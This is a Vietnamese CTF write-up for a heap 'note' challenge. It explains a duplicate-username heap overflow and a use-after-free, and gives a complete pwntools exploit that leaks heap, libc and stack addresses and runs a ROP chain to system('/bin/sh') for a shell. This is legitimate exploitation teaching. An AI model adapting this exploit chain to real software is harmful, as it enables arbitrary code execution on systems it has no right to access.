# 📌 BKSEC-TTV 2025
## I. Recon

- Binary

```bash
grass@grass:/mnt/d/CTFs/2025/BKSEC-recruitment/note/chal$ file chall
chall: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=4581e68ca4ef09e6a6f30c1e3f920c4a3fa17820, for GNU/Linux 3.2.0, stripped
grass@grass:/mnt/d/CTFs/2025/BKSEC-recruitment/note/chal$ pwn checksec chall
[*] '/mnt/d/CTFs/2025/BKSEC-recruitment/note/chal/chall'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
```

- **Libc: 2.39 - Ubuntu-24.04**

## II. Reverse
- Mình đã đổi tên các biến và tạo struct đối với file `chall.i64`. Phần tiếp theo của writeup mình sẽ dùng tên biến như trong file này. Để đồng bộ thì các bạn có thể tải file tại [đây](./chall.i64)
- Với các bạn làm pwn, mình kì vọng các bạn sẽ ít nhất phải đọc hiểu được pseudocode của chương trình, nên mình sẽ không đi sâu vào phần rev nữa. Tuy nhiên đây cũng là một phần rất quan trọng, nếu các bạn chưa hiểu rõ chương trình thì sẽ rất khó để tìm ra lỗ hổng và exploit được. Do vậy nên là, again, **nếu bạn nào chưa rev chương trình thì nên đọc [file này](./chall.i64) của mình trước**. Tin mình đi, mình làm nó dễ đọc hết sức có thể rồi.

## III. Vulnerability
#### 1. Heap overflow
Lỗ hổng này gây ra bởi chức răng `register()` không kiểm tra user mới có tồn tại bên trong bộ nhớ hay chưa. 

Sau đó trong hàm `add_note()`, khi người dùng sử dụng chức năng add note vào bên trong note array của user hiện tại, thì chương trình thực hiện điều này bằng cách **tìm user có username giống với username của người dùng hiện tại**, và thêm note vào note array của **người dùng đầu tiên được tìm thấy**.

```C
void __fastcall add_note(USER *user)
{
  NOTE *new_note; // [rsp+10h] [rbp-10h]
  USER *searched_user; // [rsp+18h] [rbp-8h]

  if ( user->note_count <= 9 )
  {
    new_note = malloc(0x30uLL);
    if ( !new_note )
    {
      puts("Memory allocation failed");
      exit(1);
    }
    printf("Enter note title: ");
    fgets(new_note->title, 32, stdin);
    new_note->content = malloc(0x100uLL);
    if ( !new_note->content )
    {
      puts("Memory allocation failed");
      exit(1);
    }
    printf("Enter note content: ");
    fgets(new_note->content, 256, stdin);
    searched_user = search_user(user->username);
    searched_user->note[searched_user->note_count++] = new_note;// logic flaw here
    puts("Note added successfully");
  }
  else
  {
    puts("Note limit reached");
  }
}
```

Và vấn đề sẽ xảy ra nếu như trong bộ nhớ có tới 2 user có cùng username. Khi đó note của người này sẽ được add vô hạn vào note của người kia, dẫn đến **heap overflow**.


#### 2. Use-after-free

Trong hàm `delete_note()`, note của user được free. Tuy nhiên vùng nhớ của note không được memset về 0. Từ đó ta có lỗ hổng **user-after-free**

```C
void __fastcall delete_note(USER *user)
{
  int i; // [rsp+18h] [rbp-38h]
  int j; // [rsp+1Ch] [rbp-34h]
  char s[40]; // [rsp+20h] [rbp-30h] BYREF
  unsigned __int64 canary; // [rsp+48h] [rbp-8h]

  canary = __readfsqword(0x28u);
  view_note(user);
  printf("Enter the title of the note you want to delete: ");
  fgets(s, 32, stdin);
  for ( i = 0; ; ++i )
  {
    if ( i >= user->note_count )
    {
      puts("Note not found");
      return;
    }
    if ( !strcmp(user->note[i]->title, s) )
      break;
  }
  free(user->note[i]->content);                 // use-after-free
  free(user->note[i]);                          // use-after-free
  for ( j = i; j < user->note_count - 1; ++j )
    user->note[j] = user->note[j + 1];
  user->note[--user->note_count] = 0LL;
  puts("Note deleted successfully");
}
```

## IV. Exploit
#### 1. Intuition
- Để leak heap base, ta cần nhắc lại về struct user:
    ```C
    00000000 struct user // sizeof=0x168
    00000000 {
    00000000     char username[32];
    00000020     char password[32];
    00000040     char name[32];
    00000060     int logged_in;
    00000064     int note_count;
    00000068     NOTE *note[32];
    00000168 };

    00000168 typedef struct user USER;
    ```

    Ở bên trên ta đã biết, nếu có 2 user trùng tên thì mảng note của user có thể bị overflow vào các chunk tiếp theo.

    Từ đó dẫn đến việc ta có thể ghi đè vào `size`, `username`, `password`, `name`, ... của chunk tiếp theo thành các địa chỉ của một note khác bên trong heap.
    Sử dụng chức năng xem `username` của chunk bị ghi đè, ta sẽ leak được heap base.


- Sau khi leak được heap base, sử dụng tính năng đổi `name` của chunk bị ghi đè thành một địa chỉ chứa libc address để leak libc base, sau đó dùng chức năng xem note content để đọc giá trị bên trong con trỏ này. 

    > Ví dụ ở phần này, mình sửa `name` của user bị ghi đè thành địa chỉ của một chunk nằm trong unsortedbin, sau đó đọc được giá trị forward pointer của unsorted bin là có một địa chỉ bên trong libc. 

- Tương tự dùng environ để leak stack.

- Sửa note pointer trong note array thành return address, rồi dùng `edit_note()` để control rip. **`=> RCE`**

#### 2. Script
- Hơi bẩn vì mình gõ vội, nhưng mà có chạy:
```py
#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.39.so")

context.binary = exe
# context.terminal = ["tmux", "splitw", "-h"] 
gdbscript = '''
breakrva 0x0000000000001F32
'''

def conn():
    if args.LOCAL:
        # r = gdb.debug([exe.path], gdbscript)
        r = process([exe.path])
    else:
        r = remote("localhost", 1611)

    return r

r = conn()
def register(username, password):
    r.sendlineafter(b'Your choice: ', b'1')
    r.sendlineafter(b'Enter your full name: ', b'hieuvd')
    r.sendlineafter(b'Enter your username: ', username)
    r.sendlineafter(b'Enter your password: ', password)

def login(username, password):
    r.sendlineafter(b'Your choice: ', b'2')
    r.sendlineafter(b'Enter your username: ', username)
    r.sendlineafter(b'Enter your password: ', password)

def logout():
    r.sendlineafter(b'Your choice: ', b'3')

def add_note(title, content):
    r.sendlineafter(b'Your choice: ', b'1')
    r.sendlineafter(b'Enter note title: ', title)
    r.sendlineafter(b'Enter note content: ', content)

def delete_note(title):
    r.sendlineafter(b'Your choice: ', b'4')
    r.sendlineafter(b"Enter the title of the note you want to delete: ", title)

def view_profile():
    r.sendlineafter(b'Your choice: ', b'1')
def edit_fullname(fullname):
    r.sendlineafter(b'Your choice: ', b'2')
    r.sendlineafter(b'Your choice: ', b'1')
    r.sendlineafter(b'Enter new full name: ', fullname)
def main():

    # good luck pwning :)
    register(b'grass', b'1')
    register(b'grass', b'12')
    register(b'grass', b'123')
    login(b'grass', b'12')
    r.sendlineafter(b'Your choice: ', b'4')
    for i in range(16):
        add_note(b'grass', b'grass')
    add_note(b'grass', b'grass')
    add_note(b'grass', b'grass')
    r.sendlineafter(b'Your choice: ', b'5')
    r.sendlineafter(b'Your choice: ', b'5')

    view_profile()
    r.recvuntil(b'Username: ')
    heap_leak = u64(r.recv(6).ljust(8, b'\x00'))
    heap_base = heap_leak - 0x2bd0
    r.sendlineafter(b'Your choice: ', b'3')

    logout()
    login(b'grass', b'123')
    r.sendlineafter(b'Your choice: ', b'4')
    for i in range(8+4+4):
        add_note(b'grass', b'grass')
    r.sendlineafter(b'Your choice: ', b'5')
    r.sendlineafter(b'Your choice: ', b'3')
    login(b'grass', b'1')

    r.sendlineafter(b'Your choice: ', b'4')
    for i in range(8):
        delete_note(b'grass')
    r.sendlineafter(b'Your choice: ', b'5')
    r.sendlineafter(b'Your choice: ', b'3')
    
    # At this time the username and password are overwritten due to heap overflow
    # so we need to recalculate the username and password.
    new_username = p64(heap_base + 0x3650)
    new_password = p64(heap_base + 0x3b90)
    login(new_username, new_password)
    r.sendlineafter(b'Your choice: ', b'5')
    edit_fullname(p64(heap_base + 0x1ef0))

    r.sendlineafter(b'Your choice: ', b'3')
    r.sendlineafter(b'Your choice: ', b'3')
    
    login(b'grass', b'1')
    r.sendlineafter(b'Your choice: ', b'4')
    r.sendlineafter(b'Your choice: ', b'2')
    for i in range(0x19):
        r.recvuntil(b'Content: grass\n')
    r.recvuntil(b'Title: ')
    libc_leak = u64(r.recv(6).ljust(8, b'\x00'))
    libc.address = libc_leak - 0x203b20

    r.sendlineafter(b'Your choice: ', b'5')
    r.sendlineafter(b'Your choice: ', b'3')

    login(new_username, new_password)
    r.sendlineafter(b'Your choice: ', b'5')
    edit_fullname(p64(libc.sym['environ']))
    r.sendlineafter(b'Your choice: ', b'3')
    r.sendlineafter(b'Your choice: ', b'3')


    login(b'grass', b'1')
    r.sendlineafter(b'Your choice: ', b'4')
    r.sendlineafter(b'Your choice: ', b'2')
    for i in range(0x19):
        r.recvuntil(b'Content: grass\n')
    r.recvuntil(b'Title: ')
    stack_leak = u64(r.recv(6).ljust(8, b'\x00'))
    return_address = stack_leak - 0x190
    r.sendlineafter(b'Your choice: ', b'5')
    r.sendlineafter(b'Your choice: ', b'3')

    login(new_username, new_password)
    r.sendlineafter(b'Your choice: ', b'4')
    fake_chunk = b'a'*0x20 + p64(return_address)
    add_note(b'bbbbbbbb', fake_chunk)
    delete_note(b'bbbbbbbb')
    fake_chunk = b'a'*0x18
    add_note(b'bbbbbbbb', fake_chunk)

    fake_chunk_address = heap_base + 0x1da0
    r.sendlineafter(b'Your choice: ', b'5')
    r.sendlineafter(b'Your choice: ', b'5')
    edit_fullname(p64(fake_chunk_address))
    r.sendlineafter(b'Your choice: ', b'3')
    r.sendlineafter(b'Your choice: ', b'3')

    login(b'grass', b'1')
    r.sendlineafter(b'Your choice: ', b'4')
    for i in range(24):
        delete_note(b'grass')

    r.sendlineafter(b'Your choice: ', b'3')
    r.sendlineafter(b'Enter the title of the note you want to edit: ', b'a'*0x18)
    # 0x000000000010f75b : pop rdi ; ret
    # 0x000000000002882f : ret
    pop_rdi = libc.address + 0x000000000010f75b
    system = libc.sym['system']
    bin_sh = next(libc.search(b'/bin/sh'))
    pop_rsi = libc.address + 0x0000000000110a4d
    ret = libc.address + 0x000000000002882f
    rop = p64(pop_rdi) + p64(bin_sh) + p64(ret) + p64(system)

    r.sendlineafter(b'Enter new content: ', rop)
    log.info(f"Return address: {hex(return_address)}")
    log.success(f"Stack leak: {hex(stack_leak)}")
    log.success(f"Libc leak: {hex(libc_leak)}")
    log.success(f"Libc base: {hex(libc.address)}")
    log.info(f'Heap leak: {hex(heap_leak)}')
    log.success(f"Heap base: {hex(heap_base)}")
    

    r.interactive()


if __name__ == "__main__":
    main()

```

- Kết quả:
```bash
grass@grass:/mnt/d/CTFs/2025/BKSEC-recruitment/note/chal$ python3 solve.py
[+] Opening connection to localhost on port 1611: Done
[*] Return address: 0x7ffc77eb92f8
[+] Stack leak: 0x7ffc77eb9488
[+] Libc leak: 0x7fe2ca07ab20
[+] Libc base: 0x7fe2c9e77000
[*] Heap leak: 0x55a587c04bd0
[+] Heap base: 0x55a587c02000
[*] Switching to interactive mode
Note edited successfully
$ cat flag.txt
BKSEC{Qu1t3_s1mpl3_t0_3xp1oit_r1ght?}
[*] Interrupted
[*] Closed connection to localhost port 1611
```

## 5. Refs
- https://guyinatuxedo.github.io/27-edit_free_chunk/uaf_explanation/index.html
- https://heap-exploitation.dhavalkapil.com/diving_into_glibc_heap/bins_chunks
